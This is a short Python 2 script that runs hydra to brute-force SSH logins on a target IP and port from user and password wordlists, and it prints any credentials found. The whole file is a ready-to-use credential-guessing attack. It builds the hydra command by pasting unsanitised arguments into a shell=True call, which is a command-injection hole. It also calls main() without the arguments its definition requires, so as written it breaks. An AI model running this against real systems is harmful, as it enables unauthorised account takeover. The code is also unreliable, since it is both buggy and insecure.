#!/usr/bin/env python
import subprocess
import sys

def hydraScan(ip, port):
    print "INFO: Performing hydra ssh scan against "+ip+":"+port
    hydraCmd = "hydra -L wordlists/users.txt -P wordlists/passwords.txt -f -t 4 -o reports/ssh/"+ip+"_hydra.txt -u "+ip+" -s "+port+" ssh"
    #hydraCmd = "hydra -l root -P wordlists/passwords.txt -f -t 4 -u "+ip+" -s "+port+" ssh"
    try:
        results = subprocess.check_output(hydraCmd , shell=True)
        result_list = results.split("\n")
        for result in result_list:
            if "login:" in result:
                print "[*] Found valid ssh credentials for "+ip+":"+port+"\n" + result 
    except:
        print "[*] Not found valid ssh credentials"

def main(ip, port):
    if len(sys.argv) != 3:
        print "Usage: ssh-scan.py <ip> <port>"
        sys.exit(0)
    ip = sys.argv[1]
    port = sys.argv[2]
    hydraScan(ip, port)

main()
